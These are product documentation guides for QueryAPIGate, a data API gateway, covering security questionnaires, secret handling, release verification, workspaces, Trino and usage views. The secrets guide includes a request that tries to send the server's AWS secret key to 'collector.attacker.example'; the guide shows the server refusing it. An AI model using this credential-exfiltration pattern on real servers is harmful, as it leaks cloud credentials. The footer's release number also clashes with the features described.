t: Answer a security questionnaire about data and cryptography
x: Time: 30 minutes. You'll end up with: answers to the data-protection and cryptography sections of a vendor security questionnaire (SIG, CAIQ, or your customer's own) - each backed by what your QueryAPIGate deployment actually does, checked on it, not taken on trust. Every command and output below was run against a real server: gunicorn with the image's configuration, encryption at rest on (QUERYAPIGATE_SECRET_KEY), and people signing in with JWTs (QUERYAPIGATE_JWT_SECRET), calling a saved query that takes a customer's email address. The reference throughout is Where data goes.

t: Answer a security questionnaire about data and cryptography
h: "What personal data does the system process, and why?"
x: From the page's personal data table: callers' names (an email address, for a person signed in with a token - jwt:alice@example.com), administrators' names and email addresses, IP addresses, an AI agent's write arguments - and whatever your databases hold, which passes through. Answer it for your deployment by what you've turned on: no SSO and no JWTs, and no person is named at all, only API keys.

t: Answer a security questionnaire about data and cryptography
x: A call that sends the email address in the URL: GET /q/orders?email=alice@example.com Authorization: Bearer [{"id": 1, "total": 42.5}, {"id": 3, "total": 7.25}] What the access log and the application log say about it: 21:25:26,945 INFO queryapigate [5c383d185428 key=jwt:alice@example.com]: Executing on shop (sqlite), limit=10 offset=0 timeout=30.0: SELECT id, total FROM orders WHERE email = :email 21:25:26,946 INFO queryapigate [5c383d185428 key=jwt:alice@example.com]: GET /q/orders -> 200 in 2.8ms 127.0.0.1 - [12/Oct/2026:21:25:26 +0530] "GET /q/orders HTTP/1.1" 200 46 0.003582s rid=5c383d185428 "curl/8.5.0" The path, never the query string; no referrer; the statement with its placeholder, :email - the value is bound, not written into it. The caller is named: jwt:alice@example.com is personal data, in the log. Lines in the log with the email address that was in the URL: 0 The answer: Requests are logged by path, method, status, time, request id, client address and caller name - a signed-in person's caller name is their identifier; parameter values are not logged - unless you set QUERYAPIGATE_ACCESS_LOG_QUERY=1. Say what can still reach the log: an ad-hoc statement's text (QUERYAPIGATE_HISTORY_ADHOC_SQL=hash keeps it to a hash), and a database's own error message, which can quote a value.

t: Answer a security questionnaire about data and cryptography
x: A connection's password, as the store's file holds it: warehouse password, as stored: enc:gAAAAABqzQLfRV4CV5r8TOcz0G3Q0nJWxsBk_3tW... Fernet - AES-128 and HMAC-SHA256 - under QUERYAPIGATE_SECRET_KEY, kept outside the store; API keys and admin tokens are only ever stored as SHA-256 hashes. The answer: credentials at rest are encrypted or hashed; the store itself (configuration and run history, no query results) should sit on an encrypted volume or database, which is the platform's - QueryAPIGate doesn't encrypt the whole file. Or keep passwords out of the store entirely: references to Vault or AWS Secrets Manager (ADR 0015).

t: Answer a security questionnaire about data and cryptography
h: "How long is each kind of data retained?"
x: From the server, as it's configured (GET /api/v1/settings): QUERYAPIGATE_HISTORY_LIMIT: 50 runs QUERYAPIGATE_HISTORY_RETENTION_DAYS: per-version limit QUERYAPIGATE_HISTORY_ADHOC_SQL: text QUERYAPIGATE_AUDIT_LOG_LIMIT: 500 QUERYAPIGATE_ACCESS_LOG_QUERY: off QUERYAPIGATE_SECRET_KEY: enabled And what a run's history keeps: {'duration_ms': 1, 'key_name': 'jwt:bob@example.com', 'query': 'orders', 'rows': 1, 'status': 'success', 'transport': 'rest', 'version': 1} Who, which query, how many rows, how long - no parameter values, no rows. The page's store table gives every kind's retention and the setting that bounds it; copy the rows that apply. Logs, traces and SIEM copies are kept as your platforms keep them - say so, with their retention.

t: Answer a security questionnaire about data and cryptography
h: "Can you delete an individual's data on request?"
x: How much there is - queryapigate history forget ... --dry-run, or through the API: DELETE /api/v1/history?caller=jwt:alice@example.com&dry_run=true {"runs": 3, "usage_periods": 0} queryapigate history forget jwt:alice@example.com Deleted 3 run(s) and 0 usage period(s) of jwt:alice@example.com; recorded in the audit log by its hash, not its name. Alice's runs are gone; Bob's are not (0 runs and 1 run). The audit log records that it happened: {'actor': 'cli', 'action': 'forget_caller', 'target': 'history', 'changes': {'caller_sha256': '9e5bf797f99329d553c1ded1513172191bcaed59d54d26322c946aaf41b2e08d', 'runs': 3, ...}} sha256("jwt:alice@example.com") is 9e5bf797...e08d: anyone who knows the name can confirm the request was met; the log names no one to anyone who doesn't. What isn't erased, and why - the audit log's entries about administrators, write requests for their 30 days, your log platform - is on the page.

t: Answer a security questionnaire about data and cryptography
x: The precise answer: QueryAPIGate uses only FIPS-approved algorithms, and runs on a FIPS 140-validated module when the platform provides one. Validation belongs to the module (OpenSSL), not the application. The page lists every use - what it protects, the algorithm, the library - and a test fails if the code ever gains one that isn't approved. On Red Hat Enterprise Linux 9 in FIPS mode, with Python and cryptography from the distribution - what CI runs the whole suite on: OpenSSL (ssl): OpenSSL 3.5.8 25 Aug 2026 cryptography 41.0.7 on OpenSSL 3.5.8 25 Aug 2026 - FIPS: True md5 refused: [digital envelope routines] unsupported Fernet round trip: True Say what is outside that boundary in your deployment: the PostgreSQL and MySQL drivers' binary wheels (build psycopg2 from source), DuckDB's TLS for remote files, and a JDBC or H2 connection's Java runtime.

t: Answer a security questionnaire about data and cryptography
x: By capability, per administrator role: run history and the audit log need observe; keys need access.read; an agent's write arguments need writes.approve; erasing someone, history.forget - owners only. Callers see only what their key or role grants, after column masking. The page's tables have a "Read by" column for each kind of data.

t: Answer a security questionnaire about data and cryptography

A record of processing (GDPR Article 30) can be built from the page's personal-data and store tables: the categories, the purposes, the retention, who reads it. QueryAPIGate isn't certified, and can't be: SOC 2 and ISO 27001 audit your organisation. The page and these checks are what your auditor reads about this part of it.

t: Keep the server's own secrets, and its metrics, in
x: Time: 15 minutes. You'll end up with: connections that can reference only the environment variables you list, never the server's own credentials, and /metrics readable by your Prometheus and your administrators and no one else - each checked on a running server. Two things a server can hand out without anyone meaning it to, both closed in 0.30: A connection's ${VAR} password is read from the server's environment - and the environment holds more than connection passwords: the cloud credentials the server runs with, tokens for other services. An administrator who may change connections could point one at a host of theirs and have the server send it one of those as a password. /metrics needs no API key - a scraper shouldn't hold one - so anyone who can reach the server reads it, and its labels name your API keys, saved queries and connections. Every command and output below was run against a real server (queryapigate serve), a PostgreSQL 16 database, and Prometheus 3.15. The server's environment held the warehouse password, an AWS secret key (standing in for the identity it runs with) and a credential for something else: QUERYAPIGATE_API_KEY=ci-admin-key WAREHOUSE_PASSWORD=warehouse-pw-1 AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY DB_ADMIN_PW=root-pw-not-for-queryapigate

t: Keep the server's own secrets, and its metrics, in
h: The server's own credentials are never reachable
x: A connection whose password is a reference, and a query on it: curl -X POST http://127.0.0.1:5077/api/v1/connections -H "X-API-Key: $ADMIN" -H 'Content-Type: application/json' \ -d '{"name": "warehouse", "db": "postgres", "host": "127.0.0.1", "port": 55443, "user": "postgres", "password": "${WAREHOUSE_PASSWORD}", "database": "postgres", "active": true}' GET /q/orders [{"id":1,"total":42.5},{"id":2,"total":19.0}] The same, with the server's AWS key, and a host that isn't yours - connections/test saves nothing, so it's the quickest way to try: curl -X POST http://127.0.0.1:5077/api/v1/connections/test -H "X-API-Key: $ADMIN" -H 'Content-Type: application/json' \ -d '{"db": "postgres", "host": "collector.attacker.example", "user": "x", "password": "${AWS_SECRET_ACCESS_KEY}", "database": "x"}' {"error":"${AWS_SECRET_ACCESS_KEY} is a cloud, Vault or Kubernetes credential the server itself may use and can't be referenced - use a variable of its own for the secret","code":"invalid_body"} Refused before any connection is tried. AWS_*, AZURE_*, ARM_*, GOOGLE_*, GCP_*, VAULT_* and KUBERNETES_* are always refused, like the server's own QUERYAPIGATE_* and OTEL_* settings.

t: Keep the server's own secrets, and its metrics, in
h: List the variables your connections use
x: What no rule knows about is still reachable: a connection referencing ${DB_ADMIN_PW} saved (201), and at the next start the server said so: WARNING queryapigate: Connections and destinations reference environment variables (DB_ADMIN_PW, WAREHOUSE_PASSWORD), and QUERYAPIGATE_SECRET_ENV_VARS is unset: an administrator could reference any other variable too, and have the server send it to a host of theirs as a password. Set it to the ones in use. Set it - names, or prefixes ending in * (WAREHOUSE_*,QAG_*): QUERYAPIGATE_SECRET_ENV_VARS=WAREHOUSE_PASSWORD The warning is gone, the warehouse query answers as before, and anything else is refused - when it's saved: {"error":"${DB_ADMIN_PW} isn't one of QUERYAPIGATE_SECRET_ENV_VARS and can't be referenced - use a variable of its own for the secret","code":"invalid_body"} and when it's used, for a connection saved before the list was set: POST /execute_sql {"connection_name": "other", "sql": "SELECT 1"} {"error":"${DB_ADMIN_PW} isn't one of QUERYAPIGATE_SECRET_ENV_VARS and can't be referenced by a connection or destination","code":"connection_misconfigured"} Settings in the Console shows the list as Environment secrets. A configuration file is held to it too: config export names a password the store held as a value ${QAG_...} - add QAG_* to the list before applying one.

t: Verify a release before you run it
x: Time: 20 minutes. You'll end up with: proof that the image and chart you run were built by this repository's release workflow, from the commit it names - and a cluster that refuses anything else. From 0.31, every image and the Helm chart is signed keyless with cosign, by digest, by .github/workflows/docker.yml on the release's tag, with SLSA provenance, an SBOM and a GitHub attestation (ADR 0018). Keyless means there's no key to trust: the signing certificate names the workflow and the tag it ran on, and the signature is recorded in Sigstore's public log. Every command and output below was run for real, against the release workflow's rehearsal - the same workflow, run by hand on main, publishing under -rehearsal names (ghcr.io/anantharajuc/queryapigate-rehearsal). So its identity ends @refs/heads/main. For a release, it ends @refs/tags/v, and the names have no -rehearsal: | | Rehearsal (below) | A release | | Image | ghcr.io/anantharajuc/queryapigate-rehearsal | ghcr.io/anantharajuc/queryapigate | | Chart | ghcr.io/anantharajuc/charts-rehearsal/queryapigate | ghcr.io/anantharajuc/charts/queryapigate | | Identity | https://github.com/AnanthaRajuC/QueryAPIGate/.github/workflows/docker.yml@refs/heads/main | ...docker.yml@refs/tags/v0.31.0 | The tools: cosign 3.1.3 and, for GitHub's attestation, the gh CLI (or cosign, as shown).

What doesn't verify: # the same image, as the v0.31.0 release - it was signed on main, not that tag Error: no matching attestations: failed to verify certificate identity: no matching CertificateIdentity found ... # as another repository's workflow Error: no matching attestations: failed to verify certificate identity: no matching CertificateIdentity found ... # 0.30.0, released before signing Error: no signatures found Each release is signed in two forms: the Sigstore bundle (cosign verify, the default) and the classic .sig tag (cosign verify --new-bundle-format=false). Both verify; admission controllers below need the second.

t: Verify a release before you run it
x: A signature proves who built it, not that it's right: this repository's workflow, on that tag, from that commit. A maintainer account that's compromised can still tag a release - and Rekor's public log then records it. Pin by digest, not tag. A tag can be moved to other bytes; a digest can't, and it's what was signed. Releases before 0.31 aren't signed. A policy like the ones above refuses them.

t: Give each team its own workspace
x: Time: 15 minutes. You'll end up with: one QueryAPIGate serving several teams, each managing its own connections, saved queries and API keys in a workspace of its own - its owner running it without reaching anyone else's, its apps calling it as if it were the only one, and you, the platform team, seeing all of it. Experimental - workspaces are new in 0.38 and may change in a minor release, always noted in the changelog (what that means). A server that never creates one behaves exactly as before. Until 0.38 a server had one namespace: every administrator's role applied to every connection, key and query, so "the payments team runs its own APIs and can't touch the catalogue team's" took a server per team. A workspace (ADR 0023) is that boundary inside one server. Everything a server had is in the workspace default. It is delegated administration, not tenant isolation: every workspace runs in the same process, on the same store, and you - an owner of the server - see everything. It keeps teams out of each other's way and reach. Every command and response below was run against a real server, with the shared key demo-key.

t: Give each team its own workspace
x: As an owner of the server: curl -X POST http://127.0.0.1:5000/api/v1/workspaces -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \ -d '{"name": "payments", "description": "The payments team"}' # {"name":"payments","description":"The payments team","created_at":"2026-10-16 20:16:58","created_by":"admin","members":0} Or in the Console: Access → Workspaces → New workspace.

t: Give each team its own workspace
h: Step 2: Give the team's lead a role in it - and only there
x: Bea leads payments. She gets no role on the server itself ("role": null - say so: leaving role out is refused, so it is never by accident) and the role owner in her workspace: curl -X POST http://127.0.0.1:5000/api/v1/administrators -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \ -d '{"name": "bea", "role": null, "email": "bea@corp.com"}' curl -X PUT http://127.0.0.1:5000/api/v1/workspaces/payments/members/bea -H 'X-API-Key: demo-key' \ -H 'Content-Type: application/json' -d '{"role": "owner"}' # {"admin":"bea","role":"owner","created_at":"2026-10-16 20:16:58","added_by":"admin"} Issue her a token as in guide 43 (POST /api/v1/administrators/bea/tokens). A role in a workspace is the same four roles, for that workspace only - an owner there manages its members, but not the server's administrators, settings or other workspaces.

t: Give each team its own workspace
h: Step 3: The lead works in her workspace
x: Bea's calls name it - /w/payments/ in front of any route: curl http://127.0.0.1:5000/w/payments/api/v1/me -H 'X-API-Key: qagadm_A9NH...' # {"name": "bea", "role": "owner", "workspace": "payments", "server_wide": false, "workspaces": {"payments": "owner"}, ...} Without it she is asked to say which: curl http://127.0.0.1:5000/api/v1/queries -H 'X-API-Key: qagadm_A9NH...' # {"error":"You have no role in the workspace 'default' - only in payments: name the workspace you mean", # "code":"workspace_required","workspace":"default","workspaces":["payments"]} In the Console she needs none of this: signed in, she starts in payments, and every screen is that workspace's. She sets up her team's API as anyone would - a connection, a saved query, a key for the checkout app: W=http://127.0.0.1:5000/w/payments curl -X POST $W/api/v1/connections -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' \ -d '{"name": "orders-db", "db": "sqlite", "database": "/data/payments.db", "active": true}' curl -X POST $W/api/v1/queries -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' -d '{ "name": "orders", "description": "All orders", "connection_name": "orders-db", "publish": true, "sql": "SELECT id, customer, total FROM orders ORDER BY id"}' curl -X POST $W/api/v1/api-keys -H 'X-API-Key: qagadm_A9NH...' -H 'Content-Type: application/json' \ -d '{"name": "checkout-app", "conne

t: Give each team its own workspace
h: Step 4: The team's apps don't need to know
x: A key belongs to the workspace it was created in, and every call it makes is there - with no prefix: curl http://127.0.0.1:5000/q/orders -H 'X-API-Key: sk_YYK...' # [{"id":1,"customer":"Ana","total":42.5},{"id":2,"customer":"Ben","total":17.0}] Asked for another workspace, it gets the same answer as for one that doesn't exist - it can't learn which there are: curl http://127.0.0.1:5000/w/default/q/orders -H 'X-API-Key: sk_YYK...' # {"error":"No workspace named 'default'","code":"workspace_not_found"}

t: Give each team its own workspace
h: Step 5: What the platform team sees
x: default doesn't have the team's things - /api/v1/connections lists none of them - and you reach them by naming the workspace: curl http://127.0.0.1:5000/w/payments/api/v1/connections -H 'X-API-Key: demo-key' # {"items": [{"name": "orders-db", ...}]} The audit log says where each change happened - in the entry, under its hash chain. Bea reads her workspace's; a server-wide role reads all of it, or one workspace's (?workspace=payments): curl http://127.0.0.1:5000/w/payments/api/v1/audit -H 'X-API-Key: qagadm_A9NH...' # create_key checkout-app, save_query orders, create_connection orders-db, set_workspace_member, create_workspace # - each with "workspace": "payments" Alerts, run history, live events and usage quotas are the workspace's own too; in /metrics its keys and connections are counted as payments/checkout-app, payments/orders-db.

t: Give each team its own workspace
x: A configuration file can describe one workspace - workspace: at the top - and is applied there only: queryapigate config export --workspace payments --kinds connections,queries > payments.yaml format: queryapigate-config format_version: 1 workspace: payments connections: name: orders-db db: sqlite ... queryapigate config apply payments.yaml (or POST /w/payments/api/v1/config/apply) - Bea, as its owner, may apply it; sent to any other workspace it is refused. The CLI's other commands take --workspace too: queryapigate export orders --workspace payments --out ....

t: Give each team its own workspace
x: Only an empty one - what it owns is never deleted with it - and never default: curl -X DELETE http://127.0.0.1:5000/api/v1/workspaces/payments -H 'X-API-Key: demo-key' # {"error":"Workspace 'payments' still has 1 connection, 1 query, 1 API key - delete or move them first", # "code":"workspace_not_empty","contents":{"connections":1,"queries":1,"API keys":1}}

t: Give each team its own workspace
x: A local-folder destination is only in default - the folders exports may write under are the server's. Use an object-storage destination in a workspace. Signed-in app users (JWT): set QUERYAPIGATE_JWT_WORKSPACE_CLAIM to a claim that names each user's workspace, so the token decides it - a user can't reach another team's by changing the /w// prefix. Unset, every signed-in user acts in default. No per-workspace limits yet (each key's own rate limits and quotas work as before), and no mapping of identity- provider groups to memberships. See Workspaces for the full reference.

t: Connect to Trino
x: Time: 10 minutes. You'll end up with: one connection that reaches every catalog behind a Trino endpoint - Hive, Iceberg, Delta, Kafka, object stores, other databases - each one a governed, saved REST and MCP query, with allowed_tables, masking and a real query time limit. Experimental (ADR 0026). What it covers, the catalog model and its limits: Trino connections. Before this, Trino was reachable only through generic JDBC - no time limit, no schema browser, no allowed_tables or masking. The native type fixes all of that. Trino is a federation engine: one endpoint, many catalogs, each a different underlying system. That one fact shapes everything below - most of all how allowed_tables works.

t: Connect to Trino
x: curl -X POST http://127.0.0.1:5000/api/v1/connections -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{ "name": "warehouse", "db": "trino", "host": "trino.internal", "port": 8080, "user": "queryapigate", "database": "tpch", "options": { "schema": "tiny", "http_scheme": "http" }, "active": true }' Needs pip install "queryapigate[trino]". The fields that are specific to Trino: database is the Trino catalog (here tpch, a catalog every Trino ships with). This is the one field that reads differently from the SQL dialects, where database is a database on the server. options.schema is the default schema within that catalog (here tiny), and options.http_scheme is http or https. A password, if given, is sent as HTTP basic auth and only over https. Test and browse it like any other connection - the schema browser reads the catalog's information_schema, scoped to the default schema: curl -X POST http://127.0.0.1:5000/api/v1/connections/test -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \ -d '{"db": "trino", "host": "trino.internal", "port": 8080, "user": "queryapigate", "database": "tpch", "options": {"schema": "tiny", "http_scheme": "http"}}' # {"elapsed_ms": 518.1} curl http://127.0.0.1:5000/connections/warehouse/schema -H 'X-API-Key: demo-key' # {"tables": [{"name": "customer", ...}, {"name": "nation", ...}, {"name": "orders", ...}], "truncated": false}

t: Connect to Trino
h: Step 2: database is a catalog - switch between them
x: A Trino endpoint usually exposes several catalogs. In the Console, Connections → (the connection) → switch database lists them with SHOW CATALOGS and switches which one the connection queries: curl 'http://127.0.0.1:5000/api/v1/connections/databases' -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' \ -X POST -d '{"db": "trino", "host": "trino.internal", "port": 8080, "user": "queryapigate", "database": "tpch", "options": {"http_scheme": "http"}}' # {"databases": ["jmx", "memory", "system", "tpcds", "tpch"]} Within a catalog, tables are addressed by schema.table, and across catalogs by catalog.schema.table - ordinary Trino SQL. Save a query exactly as for any SQL connection (guide 01): curl -X POST http://127.0.0.1:5000/api/v1/queries -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{ "name": "nations_by_region", "connection_name": "warehouse", "sql": "SELECT n.name FROM nation n JOIN region r ON n.regionkey = r.regionkey WHERE r.name = :region", "parameters": {"region": {"type": "str", "required": true, "description": "Region name, e.g. EUROPE"}}, "author": "you", "description": "Nations in a region", "publish": true }' curl 'http://127.0.0.1:5000/q/nations_by_region?region=EUROPE' -H 'X-API-Key: demo-key' # [{"name": "FRANCE"}, {"name": "GERMANY"}, {"name": "ROMANIA"}, {"name": "RUSSIA"}, {"name": "UNITED KINGDOM"}]

t: Connect to Trino
h: Step 3: allowed_tables is fully qualified - the federation safety point
x: For every other dialect, allowed_tables matches a bare table name. For a federation engine that would be dangerous: a grant of orders would match orders in every catalog the connection can see. So on Trino the match is fully qualified - catalog.schema.table - with the catalog and schema a reference omits filled in from the connection's defaults. A grant of orders on the warehouse connection above (tpch / tiny) therefore means tpch.tiny.orders only: curl -X POST http://127.0.0.1:5000/api/v1/api-keys -H 'X-API-Key: demo-key' -H 'Content-Type: application/json' -d '{ "name": "reporting", "connections": ["warehouse"], "allowed_tables": ["orders"] }' # the default catalog + schema's orders: allowed curl -X POST http://127.0.0.1:5000/execute_sql -H 'X-API-Key: reporting-secret' -H 'Content-Type: application/json' \ -d '{"sql": "SELECT count(*) FROM orders", "connection_name": "warehouse"}' # [{"_col0": 15000}] # the SAME table name in another schema or catalog: refused curl -X POST http://127.0.0.1:5000/execute_sql -H 'X-API-Key: reporting-secret' -H 'Content-Type: application/json' \ -d '{"sql": "SELECT count(*) FROM sf1.orders", "connection_name": "warehouse"}' # {"error": "This API key may only query these tables: tpch.tiny.orders. Forbidden: tpch.sf1.orders.", # "code": "table_not_allowed"} To grant a table in another schema or catalog, qualify the grant: "allowed_tables": ["sf1.

t: Connect to Trino
h: What governance you get - and what you don't
x: Everything works through sqlglot's trino dialect, so it's the same as any SQL connection: Column masking (guide 45) and the tables-and-joins diagram both work. The query time limit cancels the running query on the Trino cluster, so a slow federated query can't run forever. Read-only rests on the SQL guard (Trino has no read-only session mode), the same as duckdb/h2/jdbc: a non-read statement is refused before it runs. Not there yet: Agent writes (guide 49) aren't supported on Trino. Primary/foreign keys and DDL in the schema browser (Trino has no enforced constraints).

t: Connect to Trino
h: The outer boundary: a scoped Trino user
x: A connection reaches whatever its Trino user can reach. allowed_tables narrows within that, but the strongest boundary is Trino's own access control: give each connection a read-only Trino user scoped to the catalogs and schemas it should see, and let QueryAPIGate's grants narrow from there. That way a mistake in a grant can't reach a catalog the user was never allowed to touch.

t: Connect to Trino
x: Restrict a key to specific tables - the full allowed_tables reference; Trino's qualified matching is the one dialect-specific twist. Hide personal data from a partner or an AI agent - masking works on Trino like any SQL connection. Let an AI agent call your saved queries via MCP - a Trino-backed saved query is an MCP tool like any other.

t: See what's being used, from the Console
x: Time: 10 minutes. You'll end up with: a clear read on which keys, connections, queries and tools are actually in use - which ones are busy, which are granted but never touched - without wiring up any external monitoring. There are two kinds of usage view in the Console, and it helps to know which you're looking at: Activity over the last 30 days - drawn from the run log, so it survives restarts. This is the sparklines and the per-key usage history below. Live counts since this server process started - in-memory, reset on restart. This is the "Usage" column on each table, the Metrics screen, and /metrics.

t: See what's being used, from the Console
h: 1. Activity sparklines: who's busy, who's idle
x: Five Console tables now carry a small 30-day activity sparkline per row - a GitHub-style graph of runs per day: | Screen | One sparkline per… | Shows | | Access → API keys | key | how much each key is used (and links to its details) | | Access → Roles | role | the combined activity of the keys created from that role | | Data → Connections | connection | traffic to each database | | Data → Caching | cached query | which cache_ttl queries actually get hit | | MCP server | tool | a saved-query tool's MCP calls (built-in tools show "—") | A drawn line means traffic; a flat baseline means "granted but never used in 30 days" - often the most useful thing on the screen, because it points at access you can take away. Hover any sparkline for the totals (for example "example-reporting: 28 runs over 30 days · 3 failed · peak 3/day").

t: See what's being used, from the Console
h: 2. A key in full: the Details screen
x: On Access → API keys, each row has a Details link. It opens a page built entirely from that key's own activity: the saved queries (APIs) it can reach, and how each is granted; the connections and tables behind them, its limits and masking; last used, and its full run history - every call, with when, what, rows, duration and result; a per-API sparkline, scoped to this key, so you can see which of its granted APIs it actually calls. Clicking a query there opens its SQL. This is the fastest way to answer "what has this partner's key been doing?"

t: See what's being used, from the Console
h: 3. Who's using how much: usage quotas
x: Usage quotas (ADR 0011) count calls and rows per caller, per day and per month, in the store - so they're durable like the sparklines. GET /api/v1/usage/quotas is what the Console reads: curl http://127.0.0.1:5000/api/v1/usage/quotas -H 'X-API-Key: demo-key' {"items": [ {"caller": "example-dashboard", "per": "month", "period": "2026-10", "calls": 24, "rows": 8013, ...}, {"caller": "example-executive", "per": "month", "period": "2026-10", "calls": 19, "rows": 6937, ...}, ...]} These are the numbers a key's quota is measured against (Give a partner a quota and a concurrency cap).

t: See what's being used, from the Console
h: 4. Server-wide, right now: the Metrics screen
x: Observability → Metrics shows request volume, latency and error rate across the whole server. These come from in-memory counters, the same ones /metrics exposes in Prometheus format - so they count only since this process started, and a restart resets them. That's why a freshly restarted server shows low "Usage" numbers on the key and connection tables even when the 30-day sparklines are full: the sparklines read the durable run log, the Usage column reads these live counters. For dashboards and alerting over time, scrape /metrics - Wire up Prometheus and Grafana.

t: See what's being used, from the Console
h: 5. What agents did: the Agents screen
x: Observability → Agents is the usage view for AI clients: what each agent called over MCP, in the recent window. GET /api/v1/usage/agents backs it: curl http://127.0.0.1:5000/api/v1/usage/agents -H 'X-API-Key: demo-key' # {"since": "...", "until": "...", "sample_rate": 1.0, "truncated": false, "items": [...]} For the data dictionary agents see, and more on this screen, see Tell agents what your data means, and see what they did.

t: See what's being used, from the Console
h: 6. The run log behind all of it
x: Every view above the sparklines and histories is the run log, read different ways. Query it directly, filtered by key, query, status, kind or a time window: curl 'http://127.0.0.1:5000/api/v1/history?key=example-reporting&limit=3' -H 'X-API-Key: demo-key' {"items": [ {"query": "example_top_films", "kind": "saved", "executed_at": "2026-10-19 05:51:56", "connection_name": "examples", "transport": "rest", "status": "success", "rows": 613, "duration_ms": 748}, ...], "next_cursor": null} For a live feed rather than history, the Home screen's requests panel updates in real time as queries run (over /events), and you can build your own - Build a client that watches queries run.

t: See what's being used, from the Console
x: Wire up Prometheus and Grafana - the live counters as dashboards and alerts. Read the audit log - not what ran, but who changed the configuration. Send the audit log to your SIEM - ship the record off the box.

A data API should be as careful as the DBA who wrote the grants. · How it is built · Read-only until told otherwise · Stable means stable · Tested against the real thing · Decisions written down · The licence · Contribute About A data API should be as careful as the DBA who wrote the grants. QueryAPIGate began as SQL2API: a way to turn a SQL query into an endpoint without writing the same controller for the fortieth time. It grew into a governance layer because every team that exposed data also needed to say who could ask, what they could see, and prove it afterwards. Then AI agents arrived with the same questions. Author Anantha Raju C Licence Apache-2.0 Current release 0.34, October 2026 Runtime Python 3.11 to 3.14 Status Beta, versioned schema, compatibility promise for stable features Contact arcswdev@gmail.com How it is built Read-only until told otherwise Writes are opt-in per connection or key, narrowed to specific operations, and for agents gated by a person. The default is the safe one. Stable means stable Features under the compatibility promise do not break in a minor release. Experimental ones
